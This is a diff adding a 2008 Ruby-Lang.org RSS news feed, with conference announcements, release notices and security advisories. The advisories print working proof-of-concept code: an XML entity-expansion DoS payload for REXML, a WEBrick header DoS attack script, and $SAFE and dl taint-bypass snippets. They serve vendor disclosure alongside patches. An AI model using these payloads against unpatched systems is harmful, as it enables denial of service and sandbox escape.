@@ -1,0 +1,391 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>Ruby News</title>
+    <link>http://www.ruby-lang.org/en/feeds/news.rss/</link>
+    <language>en-us</language>
+    <ttl>40</ttl>
+    <description>The latest news from Ruby-Lang.org.</description>
+
+
+        <item>
+          <title>Scotland on Rails 2009</title>
+          <description>&lt;p&gt;&lt;a href=&quot;http://scotlandonrails.com&quot;&gt;Scotland on Rails&lt;/a&gt; is pleased to announce that Conference2009 will be held March 26-28 in Edinburgh, Scotland.&lt;/p&gt;
+
+
+	&lt;p&gt;We are now accepting submissions. The closing date for submissions is December 1st 2008, so there&amp;#8217;s still time!  Please mail your plaintext proposals for 45 minute sessions to &lt;a href=&quot;mailto:submissions@scotlandonrails.com&quot;&gt;submissions@scotlandonrails.com&lt;/a&gt;.&lt;/p&gt;
+
+
+	&lt;p&gt;Alternatively, if you are interested in sponsoring the conference, please mail &lt;a href=&quot;mailto:sponsorship@scotlandonrails.com&quot;&gt;sponsorship@scotlandonrails.com&lt;/a&gt; for a prospectus.&lt;/p&gt;
+
+
+	&lt;p&gt;Lastly, if you wish to be notified when we open for registration, you can sign up on the site.&lt;/p&gt;
+
+
+	&lt;p&gt;Come and enjoy all that Edinburgh has to offer (whisky! castle! volcano! ruby! whisky!) in March.  We hope to see you there.&lt;/p&gt; </description>
+          <pubDate>Mon, 10 Nov 2008 14:55:53 GMT</pubDate>
+          <guid>http://www.ruby-lang.org/en/news/2008/11/10/scotland-on-rails-2009/</guid>
+          <link>http://www.ruby-lang.org/en/news/2008/11/10/scotland-on-rails-2009/</link>
+        </item>
+
+        <item>
+          <title>MountainWest RubyConf 2009 dates and CFP</title>
+          <description>&lt;p&gt;&lt;a href=&quot;http://mtnwestrubyconf.org&quot;&gt;MountainWest RubyConf 2009&lt;/a&gt;  will be held March 13-14, 2009, in Salt Lake City, Utah, &lt;span class=&quot;caps&quot;&gt;USA&lt;/span&gt;.&lt;/p&gt;
+
+
+	&lt;p&gt;Proposals to speak at this regional conference are now being accepted.  Please send your proposal to proposals@mtnwestrubyconf.org.&lt;/p&gt;
+
+
+	&lt;p&gt;The submission deadline is  midnight (MST) on December 31st, 2008.&lt;/p&gt;
+
+
+	&lt;p&gt;There are sponsorship opportunities available as well. Please contact sponsorship@mtnwestruby.org if you are interested.&lt;/p&gt;
+
+
+	&lt;p&gt;Please see &lt;a href=&quot;http://mtnwestrubyconf.org&quot;&gt;mtnwestrubyconf.org/&lt;/a&gt; for more details as they become available.&lt;/p&gt; </description>
+          <pubDate>Sat, 08 Nov 2008 15:03:32 GMT</pubDate>
+          <guid>http://www.ruby-lang.org/en/news/2008/11/08/mountainwest-rubyconf-2009-dates-and-cfp/</guid>
+          <link>http://www.ruby-lang.org/en/news/2008/11/08/mountainwest-rubyconf-2009-dates-and-cfp/</link>
+        </item>
+
+        <item>
+          <title> Ruby 1.9.1-preview 1 released</title>
+          <description>&lt;p&gt;Yugui (Yuki Sonoda) announced the release of  Ruby 1.9.1-preview 1:&lt;/p&gt;
+
+
+&lt;blockquote&gt;
+This is a preview release of Ruby 1.9.1, which will be the first stable version of the Ruby 1.9 series. Try it out now and get an early taste of a modern, faster, multilingualized, and much improved Ruby with clearer syntax.&lt;br&gt;&lt;br&gt;
+
+	&lt;p&gt;If you encounter any bugs or problems, please let us know via the official issue tracking system:&lt;/p&gt;
+
+
+	&lt;p&gt;&lt;a href=&quot;http://redmine.ruby-lang.org&quot;&gt;http://redmine.ruby-lang.org&lt;/a&gt;&lt;/p&gt;
+
+
+&lt;/blockquote&gt;
+
+	&lt;p&gt;You can download the release from;&lt;/p&gt;
+
+
+	&lt;ul&gt;
+	&lt;li&gt;&lt;a href=&quot;ftp://ftp.ruby-lang.org/pub/ruby/1.9/ruby-1.9.1-preview1.tar.bz2&quot;&gt;ftp://ftp.ruby-lang.org/pub/ruby/1.9/ruby-1.9.1-preview1.tar.bz2&lt;/a&gt;
+
+	&lt;p&gt;&lt;span class=&quot;caps&quot;&gt;SIZE&lt;/span&gt;: 6169022 bytes
+&lt;span class=&quot;caps&quot;&gt;MD5&lt;/span&gt;: 0d51dc949bb6b438ad4ebfabbb5f6754
+&lt;span class=&quot;caps&quot;&gt;SHA256&lt;/span&gt;: dc39000537d7c7528ef26af8e1c3a6215b30b6c579c615eaec7013513410456a&lt;/p&gt;&lt;/li&gt;
+	&lt;/ul&gt;
+
+
+	&lt;ul&gt;
+	&lt;li&gt;&lt;a href=&quot;ftp://ftp.ruby-lang.org/pub/ruby/1.9/ruby-1.9.1-preview1.tar.gz&quot;&gt;ftp://ftp.ruby-lang.org/pub/ruby/1.9/ruby-1.9.1-preview1.tar.gz&lt;/a&gt;
+
+	&lt;p&gt;&lt;span class=&quot;caps&quot;&gt;SIZE&lt;/span&gt;: 7409682 bytes
+&lt;span class=&quot;caps&quot;&gt;MD5&lt;/span&gt;: 738f701532452fd5d36f5c155f3ba692
+&lt;span class=&quot;caps&quot;&gt;SHA256&lt;/span&gt;: 99443bdae9f94ba7b08de187881f8cbee172379edf9c5fa85fc04c869150ff6d&lt;/p&gt;&lt;/li&gt;
+	&lt;/ul&gt;
+
+
+	&lt;ul&gt;
+	&lt;li&gt;&lt;a href=&quot;ftp://ftp.ruby-lang.org/pub/ruby/1.9/ruby-1.9.1-preview1.zip&quot;&gt;ftp://ftp.ruby-lang.org/pub/ruby/1.9/ruby-1.9.1-preview1.zip&lt;/a&gt;
+
+	&lt;p&gt;&lt;span class=&quot;caps&quot;&gt;SIZE&lt;/span&gt;: 8569116 bytes
+&lt;span class=&quot;caps&quot;&gt;MD5&lt;/span&gt;: 5f68246246c4cd29d8a3b6b34b29b6ac
+&lt;span class=&quot;caps&quot;&gt;SHA256&lt;/span&gt;: a6c3a7bf7ea83b595024764926353e08596a78e40c57ac58c568662e5e88df95&lt;/p&gt;&lt;/li&gt;
+	&lt;/ul&gt; </description>
+          <pubDate>Tue, 28 Oct 2008 19:45:27 GMT</pubDate>
+          <guid>http://www.ruby-lang.org/en/news/2008/10/28/ruby-1-9-1-preview-1-released/</guid>
+          <link>http://www.ruby-lang.org/en/news/2008/10/28/ruby-1-9-1-preview-1-released/</link>
+        </item>
+
+        <item>
+          <title>RubyConf 2008 is Sold-out</title>
+          <description>&lt;p&gt;&lt;a href=&quot;http://rubyconf.org/&quot;&gt;RubyConf 2008&lt;/a&gt;  is sold out&lt;/p&gt;
+
+
+	&lt;p&gt;However, there is a &lt;a href=&quot;http://www.regonline.com/builder/site/Default.aspx?eventid=636797&quot;&gt;waiting list&lt;/a&gt; you can join in case of cancellations.&lt;/p&gt; </description>
+          <pubDate>Thu, 02 Oct 2008 23:21:06 GMT</pubDate>
+          <guid>http://www.ruby-lang.org/en/news/2008/10/02/rubyconf-2008-is-sold-out/</guid>
+          <link>http://www.ruby-lang.org/en/news/2008/10/02/rubyconf-2008-is-sold-out/</link>
+        </item>
+
+        <item>
+          <title>Voices That Matter 2008</title>
+          <description>&lt;p&gt;Pearson Education is running a &lt;a href=&quot;http://www.voicesthatmatter.com/ruby2008/&quot;&gt;Voices That Matter&lt;/a&gt; Ruby conference this fall in Boston.  The conference, from the same people who Addison-Wesley's Professional Ruby Series, will give you a chance to meet and learn from those very same authors.  Don't miss a chance to interact with so many Ruby professionals.&lt;/p&gt; </description>
+          <pubDate>Tue, 09 Sep 2008 02:49:37 GMT</pubDate>
+          <guid>http://www.ruby-lang.org/en/news/2008/09/09/voices-that-matter-2008/</guid>
+          <link>http://www.ruby-lang.org/en/news/2008/09/09/voices-that-matter-2008/</link>
+        </item>
+
+        <item>
+          <title>DoS vulnerability in REXML</title>
+          <description>&lt;p&gt;There is a DoS vulnerability in the REXML library included in the Ruby
+Standard Library. A so-called &quot;XML entity explosion&quot; attack technique
+can be used for remotely bringing down (disabling) any application
+which parses user-provided XML using REXML.&lt;/p&gt;&lt;p&gt;Most Rails applications will be vulnerable because Rails parses
+user-provided XML using REXML by default. &lt;/p&gt; &lt;h2&gt;&lt;a name=&quot;label-0&quot; id=&quot;label-0&quot;&gt;Impact&lt;/a&gt;&lt;/h2&gt;&lt;!-- RDLabel: &quot;Impact&quot; --&gt;&lt;p&gt;An attacker can cause a denial of service by causing REXML to parse a
+document containing recursively nested entities such as:&lt;/p&gt;&lt;pre&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
+&amp;lt;!DOCTYPE member [
+  &amp;lt;!ENTITY a &quot;&amp;amp;b;&amp;amp;b;&amp;amp;b;&amp;amp;b;&amp;amp;b;&amp;amp;b;&amp;amp;b;&amp;amp;b;&amp;amp;b;&amp;amp;b;&quot;&amp;gt;
+  &amp;lt;!ENTITY b &quot;&amp;amp;c;&amp;amp;c;&amp;amp;c;&amp;amp;c;&amp;amp;c;&amp;amp;c;&amp;amp;c;&amp;amp;c;&amp;amp;c;&amp;amp;c;&quot;&amp;gt;
+  &amp;lt;!ENTITY c &quot;&amp;amp;d;&amp;amp;d;&amp;amp;d;&amp;amp;d;&amp;amp;d;&amp;amp;d;&amp;amp;d;&amp;amp;d;&amp;amp;d;&amp;amp;d;&quot;&amp;gt;
+  &amp;lt;!ENTITY d &quot;&amp;amp;e;&amp;amp;e;&amp;amp;e;&amp;amp;e;&amp;amp;e;&amp;amp;e;&amp;amp;e;&amp;amp;e;&amp;amp;e;&amp;amp;e;&quot;&amp;gt;
+  &amp;lt;!ENTITY e &quot;&amp;amp;f;&amp;amp;f;&amp;amp;f;&amp;amp;f;&amp;amp;f;&amp;amp;f;&amp;amp;f;&amp;amp;f;&amp;amp;f;&amp;amp;f;&quot;&amp;gt;
+  &amp;lt;!ENTITY f &quot;&amp;amp;g;&amp;amp;g;&amp;amp;g;&amp;amp;g;&amp;amp;g;&amp;amp;g;&amp;amp;g;&amp;amp;g;&amp;amp;g;&amp;amp;g;&quot;&amp;gt;
+  &amp;lt;!ENTITY g &quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;&amp;gt;
+]&amp;gt;
+&amp;lt;member&amp;gt;
+&amp;amp;a;
+&amp;lt;/member&amp;gt;&lt;/pre&gt;&lt;h2&gt;&lt;a name=&quot;label-1&quot; id=&quot;label-1&quot;&gt;Vulnerable versions&lt;/a&gt;&lt;/h2&gt;&lt;!-- RDLabel: &quot;Vulnerable versions&quot; --&gt;&lt;h3&gt;&lt;a name=&quot;label-2&quot; id=&quot;label-2&quot;&gt;1.8 series&lt;/a&gt;&lt;/h3&gt;&lt;!-- RDLabel: &quot;1.8 series&quot; --&gt;&lt;ul&gt;
+&lt;li&gt;1.8.6-p287 and all prior versions&lt;/li&gt;
+&lt;li&gt;1.8.7-p72 and all prior versions&lt;/li&gt;
+&lt;/ul&gt;&lt;h3&gt;&lt;a name=&quot;label-3&quot; id=&quot;label-3&quot;&gt;1.9 series&lt;/a&gt;&lt;/h3&gt;&lt;!-- RDLabel: &quot;1.9 series&quot; --&gt;&lt;ul&gt;
+&lt;li&gt;all versions&lt;/li&gt;
+&lt;/ul&gt;&lt;h2&gt;&lt;a name=&quot;label-4&quot; id=&quot;label-4&quot;&gt;Solution&lt;/a&gt;&lt;/h2&gt;&lt;!-- RDLabel: &quot;Solution&quot; --&gt;&lt;p&gt;Please download the following monkey patch to fix this problem.&lt;/p&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;http://www.ruby-lang.org/security/20080823rexml/rexml-expansion-fix2.rb&quot;&gt;&amp;lt;URL:http://www.ruby-lang.org/security/20080823rexml/rexml-expansion-fix2.rb&amp;gt;&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;p&gt;Then fix your application to load rexml-expansion-fix2.rb before using
+REXML.&lt;/p&gt;&lt;pre&gt;require &quot;rexml-expansion-fix2&quot;
+...
+doc = REXML::Document.new(str)
+...&lt;/pre&gt;&lt;p&gt;If you have a Rails application, copy rexml-expansion-fix2.rb into a
+directory on the load path (such as RAILS_ROOT/lib/), and put the
+following line into config/environment.rb.&lt;/p&gt;&lt;pre&gt;require &quot;rexml-expansion-fix2&quot;&lt;/pre&gt;&lt;p&gt;If your application is Rails 2.1 or later, you can simply copy 
+rexml-expansion-fix2.rb to RAILS_ROOT/config/initializers and it will 
+be required automatically.&lt;/p&gt;&lt;p&gt;By default, XML entity expansion limit is 10000.  You can change it by
+changing REXML::Document.entity_expansion_limit.  e.g.&lt;/p&gt;&lt;pre&gt;REXML::Document.entity_expansion_limit = 1000&lt;/pre&gt;&lt;p&gt;This fix will be made available as a gem and used by future versions of
+rails, but users should take corrective action immediately.&lt;/p&gt;&lt;h2&gt;&lt;a name=&quot;label-5&quot; id=&quot;label-5&quot;&gt;Credit&lt;/a&gt;&lt;/h2&gt;&lt;!-- RDLabel: &quot;Credit&quot; --&gt;&lt;p&gt;Credit to Luka Treiber and Mitja Kolsek of ACROS Security for
+disclosing the problem to Ruby and Rails Security Teams.&lt;/p&gt;&lt;p&gt;Credit to Michael Koziarski of Rails Core Team for creating the monkey
+patch to fix the vulnerability.&lt;/p&gt;&lt;h2&gt;&lt;a name=&quot;label-6&quot; id=&quot;label-6&quot;&gt;Changes&lt;/a&gt;&lt;/h2&gt;&lt;!-- RDLabel: &quot;Changes&quot; --&gt;&lt;ul&gt;
+&lt;li&gt;2008-08-29 18:46 +09:00  fixed the summary not to mislead that this vulnerability is Rails specific.&lt;/li&gt;
+&lt;li&gt;2008-11-09 12:40 +09:00  fixed &lt;a href=&quot;http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=502535&quot;&gt;a bug of the monkey patch&lt;/a&gt;.&lt;/li&gt;
+&lt;/ul&gt;</description>
+          <pubDate>Sat, 23 Aug 2008 07:56:11 GMT</pubDate>
+          <guid>http://www.ruby-lang.org/en/news/2008/08/23/dos-vulnerability-in-rexml/</guid>
+          <link>http://www.ruby-lang.org/en/news/2008/08/23/dos-vulnerability-in-rexml/</link>
+        </item>
+
+        <item>
+          <title>Ruby 1.8.7-p72 and 1.8.6-p287 released</title>
+          <description>&lt;p&gt;Ruby 1.8.7-p72 and 1.8.6-p287 have been released.
+The last releases were incomplete, and the new releases include fixes of &lt;a href=&quot;http://www.ruby-lang.org/en/news/2008/08/08/multiple-vulnerabilities-in-ruby/#label-3&quot;&gt;the previously announced vulnerability of dl&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;The released source archives are available at:&lt;/p&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;ftp://ftp.ruby-lang.org/pub/ruby/1.8/ruby-1.8.6-p287.tar.gz&quot;&gt;&amp;lt;URL:ftp://ftp.ruby-lang.org/pub/ruby/1.8/ruby-1.8.6-p287.tar.gz&amp;gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;ftp://ftp.ruby-lang.org/pub/ruby/1.8/ruby-1.8.6-p287.tar.bz2&quot;&gt;&amp;lt;URL:ftp://ftp.ruby-lang.org/pub/ruby/1.8/ruby-1.8.6-p287.tar.bz2&amp;gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;ftp://ftp.ruby-lang.org/pub/ruby/1.8/ruby-1.8.6-p287.zip&quot;&gt;&amp;lt;URL:ftp://ftp.ruby-lang.org/pub/ruby/1.8/ruby-1.8.6-p287.zip&amp;gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;ftp://ftp.ruby-lang.org/pub/ruby/1.8/ruby-1.8.7-p72.tar.gz&quot;&gt;&amp;lt;URL:ftp://ftp.ruby-lang.org/pub/ruby/1.8/ruby-1.8.7-p72.tar.gz&amp;gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;ftp://ftp.ruby-lang.org/pub/ruby/1.8/ruby-1.8.7-p72.tar.bz2&quot;&gt;&amp;lt;URL:ftp://ftp.ruby-lang.org/pub/ruby/1.8/ruby-1.8.7-p72.tar.bz2&amp;gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;ftp://ftp.ruby-lang.org/pub/ruby/1.8/ruby-1.8.7-p72.zip&quot;&gt;&amp;lt;URL:ftp://ftp.ruby-lang.org/pub/ruby/1.8/ruby-1.8.7-p72.zip&amp;gt;&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt; &lt;p&gt;Checksums:&lt;/p&gt;&lt;pre&gt;MD5(ruby-1.8.6-p287.tar.gz)= f6cd51001534ced5375339707a757556
+SHA256(ruby-1.8.6-p287.tar.gz)= 6463d1932c34ff72b79174ac7d2c28940d29d147928250928a00a0dbee43db57
+SIZE(ruby-1.8.6-p287.tar.gz)= 4590393
+
+MD5(ruby-1.8.6-p287.tar.bz2)= 80b5f3db12531d36e6c81fac6d05dda9
+SHA256(ruby-1.8.6-p287.tar.bz2)= ac15a1cb78c50ec9cc7e831616a143586bdd566bc865c6b769a0c47b3b3936ce
+SIZE(ruby-1.8.6-p287.tar.bz2)= 3956902
+
+MD5(ruby-1.8.6-p287.zip)= e555d51f5b387fdd52ae53d9bafa13f5
+SHA256(ruby-1.8.6-p287.zip)= 844c66c015565839531a34b83e0526cd4fa2a71cc0f5cc8ddb0d4c158403543a
+SIZE(ruby-1.8.6-p287.zip)= 5606238
+
+MD5(ruby-1.8.7-p72.tar.gz)= 5e5b7189674b3a7f69401284f6a7a36d
+SHA256(ruby-1.8.7-p72.tar.gz)= e15ca005076f5d6f91fc856fdfbd071698a4cadac3c6e25855899dba1f6fc5ef
+SIZE(ruby-1.8.7-p72.tar.gz)= 4805594
+
+MD5(ruby-1.8.7-p72.tar.bz2)= 0b215c46b89b28d7ab8d56d96e72d5b9
+SHA256(ruby-1.8.7-p72.tar.bz2)= a8f8a28e286dd76747d8e97ea5cfe7a315eb896906ab8c8606d687d9f6f6146e
+SIZE(ruby-1.8.7-p72.tar.bz2)= 4127450
+
+MD5(ruby-1.8.7-p72.zip)= b44fe5a12d4bf138ba0d3660e13a8216
+SHA256(ruby-1.8.7-p72.zip)= 77e67be4aa8c3e041e1d20d24e5fcf2e33ad9bccb3da3332b6c0a5b648334903
+SIZE(ruby-1.8.7-p72.zip)= 5855902&lt;/pre&gt;&lt;p&gt;For a full list of all changes, see the bundled files named ChangeLog, which are also available at the following locations:&lt;/p&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;http://svn.ruby-lang.org/repos/ruby/tags/v1_8_6_287/ChangeLog&quot;&gt;&amp;lt;URL:http://svn.ruby-lang.org/repos/ruby/tags/v1_8_6_287/ChangeLog&amp;gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://svn.ruby-lang.org/repos/ruby/tags/v1_8_7_72/ChangeLog&quot;&gt;&amp;lt;URL:http://svn.ruby-lang.org/repos/ruby/tags/v1_8_7_72/ChangeLog&amp;gt;&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</description>
+          <pubDate>Mon, 11 Aug 2008 02:01:00 GMT</pubDate>
+          <guid>http://www.ruby-lang.org/en/news/2008/08/11/ruby-1-8-7-p72-and-1-8-6-p287-released/</guid>
+          <link>http://www.ruby-lang.org/en/news/2008/08/11/ruby-1-8-7-p72-and-1-8-6-p287-released/</link>
+        </item>
+
+        <item>
+          <title>Multiple vulnerabilities in Ruby</title>
+          <description>&lt;p&gt;Multiple vulnerabilities have been discovered in Ruby.  It's
+recommended that you upgrade to the latest versions.&lt;/p&gt; &lt;h2&gt;&lt;a name=&quot;label-0&quot; id=&quot;label-0&quot;&gt;Details&lt;/a&gt;&lt;/h2&gt;&lt;!-- RDLabel: &quot;Details&quot; --&gt;&lt;p&gt;The following vulnerabilities have been discovered.&lt;/p&gt;&lt;h3&gt;&lt;a name=&quot;label-1&quot; id=&quot;label-1&quot;&gt;Several vulnerabilities in safe level&lt;/a&gt;&lt;/h3&gt;&lt;!-- RDLabel: &quot;Several vulnerabilities in safe level&quot; --&gt;&lt;p&gt;Several vulnerabilities in safe level have been discovered.&lt;/p&gt;&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;untrace_var is permitted at safe level 4.&lt;/p&gt;
+&lt;pre&gt;trace_var(:$VAR) {|val| puts &quot;$VAR = #{val}&quot; }
+
+Thread.new do
+ $SAFE = 4
+ eval %q{
+   proc = untrace_var :$VAR
+   proc.first.call(&quot;aaa&quot;)
+ }
+end.join&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;$PROGRAM_NAME may be modified at safe level 4.&lt;/p&gt;
+&lt;pre&gt;Thread.new do
+ $SAFE = 4
+ eval %q{$PROGRAM_NAME.replace &quot;Hello, World!&quot;}
+end.join
+
+$PROGRAM_NAME #=&amp;gt; &quot;Hello, World!&quot;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Insecure methods may be called at safe level 1-3.&lt;/p&gt;
+&lt;pre&gt;class Hello
+ def world
+   Thread.new do
+     $SAFE = 4
+     msg = &quot;Hello, World!&quot;
+     def msg.size
+       self.replace self*10 # replace string
+       1 # return wrong size
+     end
+     msg
+   end.value
+ end
+end
+
+$SAFE = 1 # or 2, or 3
+s = Hello.new.world
+if s.kind_of?(String)
+ puts s if s.size &amp;lt; 20 # print string which size is less than 20
+end&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Syslog operations are permitted at safe level 4.&lt;/p&gt;
+&lt;pre&gt;require &quot;syslog&quot;
+
+Syslog.open
+
+Thread.new do
+ $SAFE = 4
+ eval %q{
+   Syslog.log(Syslog::LOG_WARNING, &quot;Hello, World!&quot;)
+   Syslog.mask = Syslog::LOG_UPTO(Syslog::LOG_EMERG)
+   Syslog.info(&quot;masked&quot;)
+   Syslog.close
+ }
+end.join&lt;/pre&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;p&gt;These vulnerabilities were reported by Keita Yamaguchi.&lt;/p&gt;&lt;h3&gt;&lt;a name=&quot;label-2&quot; id=&quot;label-2&quot;&gt;DoS vulnerability in WEBrick&lt;/a&gt;&lt;/h3&gt;&lt;!-- RDLabel: &quot;DoS vulnerability in WEBrick&quot; --&gt;&lt;p&gt;WEBrick::HTTP::DefaultFileHandler is faulty of exponential time taking
+requests due to a backtracking regular expression in
+WEBrick::HTTPUtils.split_header_value.&lt;/p&gt;&lt;p&gt;Exploitable server:&lt;/p&gt;&lt;pre&gt;require 'webrick'
+WEBrick::HTTPServer.new(:Port =&amp;gt; 2000, :DocumentRoot =&amp;gt; &quot;/etc&quot;).start&lt;/pre&gt;&lt;p&gt;Attack:&lt;/p&gt;&lt;pre&gt;require 'net/http'
+res = Net::HTTP.start(&quot;localhost&quot;, 2000) { |http|
+  req = Net::HTTP::Get.new(&quot;/passwd&quot;)
+  req['If-None-Match'] = %q{meh=&quot;&quot;} + %q{foo=&quot;bar&quot; } * 100
+  http.request(req)
+}
+p res&lt;/pre&gt;&lt;p&gt;The request likely won't finish in this universe.&lt;/p&gt;&lt;p&gt;This vulnerability was reported by Christian Neukirchen.&lt;/p&gt;&lt;h3&gt;&lt;a name=&quot;label-3&quot; id=&quot;label-3&quot;&gt;Lack of taintness check in dl&lt;/a&gt;&lt;/h3&gt;&lt;!-- RDLabel: &quot;Lack of taintness check in dl&quot; --&gt;&lt;p&gt;dl doesn't check taintness, so it could allow attackers to call
+dangerous functions.&lt;/p&gt;&lt;pre&gt;require 'dl'
+$SAFE = 1
+h = DL.dlopen(nil)
+sys = h.sym('system', 'IP')
+uname = 'uname -rs'.taint
+sys[uname]&lt;/pre&gt;&lt;p&gt;This vulnerability was reported by sheepman.&lt;/p&gt;&lt;h3&gt;&lt;a name=&quot;label-4&quot; id=&quot;label-4&quot;&gt;DNS spoofing vulnerability in resolv.rb&lt;/a&gt;&lt;/h3&gt;&lt;!-- RDLabel: &quot;DNS spoofing vulnerability in resolv.rb&quot; --&gt;&lt;p&gt;resolv.rb allow remote attackers to spoof DNS answers.  This risk can be
+reduced by randomness of DNS transaction IDs and source ports, so resolv.rb
+is fixed to randomize them.&lt;/p&gt;&lt;ul&gt;
+&lt;li&gt;see also: &lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1447&quot;&gt;CVE-2008-1447&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;p&gt;This vulnerability was reported by Tanaka Akira.&lt;/p&gt;&lt;h2&gt;&lt;a name=&quot;label-5&quot; id=&quot;label-5&quot;&gt;Vulnerable versions&lt;/a&gt;&lt;/h2&gt;&lt;!-- RDLabel: &quot;Vulnerable versions&quot; --&gt;&lt;dl&gt;
+&lt;dt&gt;&lt;a name=&quot;label-6&quot; id=&quot;label-6&quot;&gt;1.8 series&lt;/a&gt;&lt;/dt&gt;&lt;!-- RDLabel: &quot;1.8 series&quot; --&gt;
+&lt;dd&gt;
+&lt;ul&gt;
+&lt;li&gt;1.8.5 and all prior versions&lt;/li&gt;
+&lt;li&gt;1.8.6-p286 and all prior versions&lt;/li&gt;
+&lt;li&gt;1.8.7-p71 and all prior versions&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/dd&gt;
+&lt;dt&gt;&lt;a name=&quot;label-7&quot; id=&quot;label-7&quot;&gt;1.9 series&lt;/a&gt;&lt;/dt&gt;&lt;!-- RDLabel: &quot;1.9 series&quot; --&gt;
+&lt;dd&gt;
+&lt;ul&gt;
+&lt;li&gt;r18423 and all prior revisions&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/dd&gt;
+&lt;/dl&gt;&lt;h2&gt;&lt;a name=&quot;label-8&quot; id=&quot;label-8&quot;&gt;Solution&lt;/a&gt;&lt;/h2&gt;&lt;!-- RDLabel: &quot;Solution&quot; --&gt;&lt;dl&gt;
+&lt;dt&gt;&lt;a name=&quot;label-9&quot; id=&quot;label-9&quot;&gt;1.8 series&lt;/a&gt;&lt;/dt&gt;&lt;!-- RDLabel: &quot;1.8 series&quot; --&gt;
+&lt;dd&gt;
+Please upgrade to 1.8.6-p287, or 1.8.7-p72. 
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;ftp://ftp.ruby-lang.org/pub/ruby/1.8/ruby-1.8.6-p287.tar.gz&quot;&gt;&amp;lt;URL:ftp://ftp.ruby-lang.org/pub/ruby/1.8/ruby-1.8.6-p287.tar.gz&amp;gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;ftp://ftp.ruby-lang.org/pub/ruby/1.8/ruby-1.8.7-p72.tar.gz&quot;&gt;&amp;lt;URL:ftp://ftp.ruby-lang.org/pub/ruby/1.8/ruby-1.8.7-p72.tar.gz&amp;gt;&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/dd&gt;
+&lt;dt&gt;&lt;a name=&quot;label-10&quot; id=&quot;label-10&quot;&gt;1.9 series&lt;/a&gt;&lt;/dt&gt;&lt;!-- RDLabel: &quot;1.9 series&quot; --&gt;
+&lt;dd&gt;
+&lt;p&gt;Please check out the latest version using Subversion.&lt;/p&gt;
+&lt;pre&gt;$ svn co http://svn.ruby-lang.org/repos/ruby/trunk ruby&lt;/pre&gt;
+&lt;/dd&gt;
+&lt;/dl&gt;&lt;p&gt;Please note that a package that corrects this weakness may already be
+available through your package management software.&lt;/p&gt;&lt;h2&gt;&lt;a name=&quot;label-11&quot; id=&quot;label-11&quot;&gt;Credit&lt;/a&gt;&lt;/h2&gt;&lt;!-- RDLabel: &quot;Credit&quot; --&gt;&lt;p&gt;Credit to Keita Yamaguchi, Christian Neukirchen, sheepman, and Tanaka
+Akira for disclosing these problems to Ruby Security Team.&lt;/p&gt;&lt;h2&gt;&lt;a name=&quot;label-12&quot; id=&quot;label-12&quot;&gt;Changes&lt;/a&gt;&lt;/h2&gt;&lt;!-- RDLabel: &quot;Changes&quot; --&gt;&lt;ul&gt;
+&lt;li&gt;2008-08-08 12:21 +09:00  fixed the revision number of ruby 1.9.&lt;/li&gt;
+&lt;li&gt;2008-08-11 11:23 +09:00  fixed the patchlevel of ruby 1.8. see &lt;a href=&quot;http://www.ruby-lang.org/en/news/2008/08/11/ruby-1-8-7-p72-and-1-8-6-p287-released/&quot;&gt;the release announcement of Ruby 1.8.7-p72 and 1.8.6-p287&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</description>
+          <pubDate>Fri, 08 Aug 2008 02:59:49 GMT</pubDate>
+          <guid>http://www.ruby-lang.org/en/news/2008/08/08/multiple-vulnerabilities-in-ruby/</guid>
+          <link>http://www.ruby-lang.org/en/news/2008/08/08/multiple-vulnerabilities-in-ruby/</link>
+        </item>
+
+        <item>
+          <title>RubyConf 2008 Proposals Now Being Accepted</title>
+          <description>&lt;p&gt;&lt;a href=&quot;http://www.rubyconf.org&quot;&gt;RubyConf 2008&lt;/a&gt;  will be held in Orlando, Florida, &lt;span class=&quot;caps&quot;&gt;USA&lt;/span&gt;, from November 6 to November 8.&lt;/p&gt;
+
+
+	&lt;p&gt;&lt;a href=&quot;http://www.rubyconf.org/proposals/new&quot;&gt;Proposals for presentations&lt;/a&gt; are now begin accepted.  All proposals must be received by August 21.&lt;/p&gt; </description>
+          <pubDate>Mon, 04 Aug 2008 20:26:29 GMT</pubDate>
+          <guid>http://www.ruby-lang.org/en/news/2008/08/04/rubyconf-2008-proposals-now-being-accepted/</guid>
+          <link>http://www.ruby-lang.org/en/news/2008/08/04/rubyconf-2008-proposals-now-being-accepted/</link>
+        </item>
+
+        <item>
+          <title>Arbitrary code execution vulnerabilities</title>
+          <description>&lt;p&gt;Multiple vulnerabilities in Ruby may lead to a denial of service (DoS)
